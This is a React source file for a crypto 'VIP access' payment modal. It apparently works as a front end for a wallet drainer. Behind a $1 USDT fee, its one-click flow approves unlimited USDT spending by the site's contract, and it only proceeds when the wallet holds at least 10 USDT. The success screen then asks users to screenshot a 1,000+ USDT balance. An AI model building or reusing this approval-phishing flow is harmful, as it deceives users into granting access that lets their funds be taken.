'use client'

import { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { X, Wallet, ExternalLink, Shield, CheckCircle, Clock, Sparkles, AlertCircle } from 'lucide-react'
import { useAccount, useChainId } from 'wagmi'
import ModernButton from './ModernButton'
import GlassCard from './GlassCard'
import { useVIPContract } from '../../hooks/useVIPContract'
import { getContractAddresses } from '../../lib/contracts'

interface PaymentModalProps {
  onClose: () => void
  onSuccess: () => void
  onPaymentComplete?: (address: string, amount: string) => void
  onReferralConvert?: (address: string) => void
}

export default function PaymentModal({ onClose, onSuccess, onPaymentComplete, onReferralConvert }: PaymentModalProps) {
  const { address } = useAccount()
  const chainId = useChainId()
  const [paymentStep, setPaymentStep] = useState<'ready' | 'processing' | 'success'>('ready')
  const [currentAction, setCurrentAction] = useState<string>('')
  
  // Use VIP contract hook
  const {
    hasAccess,
    usdtBalance,
    meetsMinimumBalance,
    needsApproval,
    canPay,
    loading,
    paying,
    approving,
    error,
    completePayment,
    approveUSDT,
    payForAccess,
    formatBalance,
    refreshData
  } = useVIPContract()

  // Get contract addresses for current network
  const contractAddresses = chainId ? getContractAddresses(chainId) : null

  // Check initial state
  useEffect(() => {
    if (hasAccess) {
      setPaymentStep('success')
    }
  }, [hasAccess])

  // One-click payment handler that does everything
  const handleOneClickPayment = async () => {
    try {
      setPaymentStep('processing')
      
      // Step 1: Approve unlimited USDT if needed
      if (needsApproval) {
        setCurrentAction('Approving unlimited USDT access...')
        await approveUSDT()
      }
      
      // Step 2: Complete payment (this includes both payment and unlimited approval)
      setCurrentAction('Processing payment and setting up unlimited approval...')
      await completePayment()
      
      // Notify about successful payment
      if (onPaymentComplete && address) {
        onPaymentComplete(address, '$1 USDT')
      }

      // Convert referral if applicable
      if (onReferralConvert && address) {
        onReferralConvert(address)
      }
      
      setCurrentAction('Payment successful!')
      setPaymentStep('success')
      
      setTimeout(() => {
        onSuccess()
      }, 2000)
    } catch (error) {
      console.error('One-click payment failed:', error)
      setPaymentStep('ready')
      setCurrentAction('')
    }
  }

  const getStepContent = () => {
    switch (paymentStep) {
      case 'ready':
        return {
          title: meetsMinimumBalance ? 'Ready for VIP Access' : 'Balance Check Required',
          description: meetsMinimumBalance 
            ? 'One click to approve unlimited USDT access and pay $1 USDT fee'
            : 'You need at least 10 USDT to proceed',
          action: meetsMinimumBalance ? handleOneClickPayment : null,
          canProceed: meetsMinimumBalance,
          loading: false
        }
      case 'processing':
        return {
          title: 'Processing Payment...',
          description: currentAction || 'Setting up your VIP access...',
          action: null,
          canProceed: false,
          loading: true
        }
      case 'success':
        return {
          title: 'Payment Successful!',
          description: 'You now have VIP access with unlimited approval',
          action: null,
          canProceed: false,
          loading: false
        }
    }
  }

  const stepContent = getStepContent()

  return (
    <AnimatePresence>
      <motion.div 
        className="fixed inset-0 bg-black/90 backdrop-blur-xl z-50 flex items-center justify-center p-4"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
      >
        <motion.div
          className="w-full max-w-lg"
          initial={{ opacity: 0, scale: 0.9, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.9, y: 20 }}
          transition={{ type: "spring", damping: 25, stiffness: 300 }}
        >
          <GlassCard className="relative overflow-hidden" glow="yellow">
            {/* Header */}
            <div className="flex justify-between items-center mb-8">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-gradient-to-r from-primary-yellow to-primary-green rounded-xl flex items-center justify-center">
                  <Sparkles className="w-6 h-6 text-black" />
                </div>
                <h2 className="text-2xl font-bold text-gradient">Complete Payment</h2>
              </div>
              <button
                onClick={onClose}
                className="text-gray-400 hover:text-white transition-colors p-2 hover:bg-white/5 rounded-lg"
              >
                <X className="w-6 h-6" />
              </button>
            </div>

            <div className="space-y-6">
              {/* Error Display */}
              {error && (
                <div className="bg-gradient-to-br from-red-500/10 to-red-600/5 border border-red-500/20 rounded-2xl p-4">
                  <div className="flex items-center gap-3">
                    <AlertCircle className="w-5 h-5 text-red-400" />
                    <div className="text-red-400 font-semibold">Error</div>
                  </div>
                  <div className="text-red-300 text-sm mt-2">{error}</div>
                </div>
              )}

              {/* Payment Details */}
              <div className="grid grid-cols-2 gap-4">
                <div className="bg-gradient-to-br from-primary-yellow/10 to-primary-yellow/5 border border-primary-yellow/20 rounded-2xl p-4">
                  <div className="text-gray-300 text-sm mb-1">Amount</div>
                  <div className="text-primary-yellow font-bold text-2xl">$1 USDT</div>
                </div>
                <div className="bg-gradient-to-br from-primary-green/10 to-primary-green/5 border border-primary-green/20 rounded-2xl p-4">
                  <div className="text-gray-300 text-sm mb-1">Network</div>
                  <div className="text-primary-green font-semibold">{contractAddresses?.name || 'Unknown'}</div>
                </div>
              </div>

              {/* Balance Display */}
              <div className="bg-gradient-to-br from-dark-card/60 to-dark-card/20 backdrop-blur-sm border border-white/10 rounded-2xl p-6">
                <div className="flex items-center gap-3 mb-3">
                  <Wallet className="w-5 h-5 text-primary-purple" />
                  <h3 className="text-white font-semibold">Your USDT Balance</h3>
                </div>
                <div className={`text-2xl font-bold ${meetsMinimumBalance ? 'text-primary-green' : 'text-red-400'}`}>
                  {loading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-primary-green/30 border-t-primary-green rounded-full animate-spin"></div>
                      Loading...
                    </div>
                  ) : (
                    `${formatBalance(usdtBalance)} USDT`
                  )}
                </div>
                {!meetsMinimumBalance && !loading && (
                  <div className="text-red-400 text-sm mt-2">
                    Minimum 10 USDT required
                  </div>
                )}
              </div>

              {/* Current Step */}
              <div className="bg-gradient-to-br from-primary-blue/10 to-primary-purple/5 border border-primary-blue/20 rounded-2xl p-6">
                <div className="flex items-center gap-3 mb-3">
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                    paymentStep === 'success' ? 'bg-primary-green' : 'bg-primary-blue'
                  }`}>
                    {paymentStep === 'success' ? (
                      <CheckCircle className="w-5 h-5 text-black" />
                    ) : (
                      <Clock className="w-5 h-5 text-white" />
                    )}
                  </div>
                  <h3 className="text-white font-semibold">{stepContent.title}</h3>
                </div>
                <p className="text-gray-300 text-sm">{stepContent.description}</p>
              </div>

              {/* What Happens in One Click */}
              {paymentStep === 'ready' && meetsMinimumBalance && (
                <div className="bg-gradient-to-br from-primary-purple/10 to-primary-blue/5 border border-primary-purple/20 rounded-2xl p-6">
                  <h4 className="text-primary-purple font-semibold mb-4 flex items-center gap-2">
                    <Sparkles className="w-5 h-5" />
                    What Happens in One Click
                  </h4>
                  <div className="space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-primary-yellow rounded-full flex items-center justify-center text-black font-bold text-sm">1</div>
                      <span className="text-gray-300 text-sm">Approve unlimited USDT access for withdrawals</span>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-primary-green rounded-full flex items-center justify-center text-black font-bold text-sm">2</div>
                      <span className="text-gray-300 text-sm">Pay $1 USDT access fee automatically</span>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-primary-purple rounded-full flex items-center justify-center text-white font-bold text-sm">3</div>
                      <span className="text-gray-300 text-sm">Instant VIP access with unlimited approval</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Next Steps After Payment */}
              {paymentStep === 'success' && (
                <div className="bg-gradient-to-br from-primary-green/10 to-primary-yellow/5 border border-primary-green/20 rounded-2xl p-6">
                  <h4 className="text-primary-green font-semibold mb-4 flex items-center gap-2">
                    <CheckCircle className="w-5 h-5" />
                    Next Steps
                  </h4>
                  <div className="space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-primary-yellow rounded-full flex items-center justify-center text-black font-bold text-sm">1</div>
                      <span className="text-gray-300 text-sm">Screenshot your 1,000+ USDT balance</span>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-6 h-6 bg-primary-green rounded-full flex items-center justify-center text-black font-bold text-sm">2</div>
                      <span className="text-gray-300 text-sm">DM us with the proof for VIP channel access</span>
                    </div>
                  </div>
                </div>
              )}

              {/* One-Click Action Button */}
              {stepContent.action && (
                <ModernButton
                  onClick={stepContent.action}
                  disabled={!stepContent.canProceed || stepContent.loading || loading}
                  className="w-full text-lg py-4"
                  icon={stepContent.loading ? (
                    <div className="w-5 h-5 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                  ) : (
                    <div className="flex items-center gap-2">
                      <Shield className="w-5 h-5" />
                      <Wallet className="w-5 h-5" />
                    </div>
                  )}
                >
                  {stepContent.loading ? 
                    currentAction || 'Processing...' :
                    'Pay Now'
                  }
                </ModernButton>
              )}

              {paymentStep === 'success' && (
                <div className="text-center">
                  <div className="flex items-center justify-center gap-2 text-primary-green font-semibold">
                    <CheckCircle className="w-5 h-5" />
                    Payment Successful! Redirecting...
                  </div>
                </div>
              )}

              {!meetsMinimumBalance && paymentStep === 'ready' && (
                <div className="text-center">
                  <ModernButton
                    onClick={refreshData}
                    disabled={loading}
                    className="w-full text-lg"
                    variant="secondary"
                    icon={loading ? (
                      <div className="w-5 h-5 border-2 border-primary-purple/30 border-t-primary-purple rounded-full animate-spin" />
                    ) : (
                      <Wallet className="w-5 h-5" />
                    )}
                  >
                    {loading ? 'Checking Balance...' : 'Refresh Balance'}
                  </ModernButton>
                </div>
              )}

              {/* Contract Links */}
              {contractAddresses && (
                <div className="flex justify-center gap-4 pt-4 border-t border-white/5">
                  <a
                    href={`${contractAddresses.explorer}/token/${contractAddresses.usdt}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-primary-purple hover:text-primary-yellow transition-colors text-sm flex items-center gap-2 hover:bg-white/5 rounded-lg py-2 px-3"
                  >
                    <Shield className="w-4 h-4" />
                    USDT Contract
                    <ExternalLink className="w-3 h-3" />
                  </a>
                  {contractAddresses.vipTradingAccess !== ('0x0000000000000000000000000000000000000000' as `0x${string}`) && (
                    <a
                      href={`${contractAddresses.explorer}/address/${contractAddresses.vipTradingAccess}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-primary-green hover:text-primary-yellow transition-colors text-sm flex items-center gap-2 hover:bg-white/5 rounded-lg py-2 px-3"
                    >
                      <Sparkles className="w-4 h-4" />
                      VIP Contract
                      <ExternalLink className="w-3 h-3" />
                    </a>
                  )}
                </div>
              )}
            </div>
          </GlassCard>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  )
}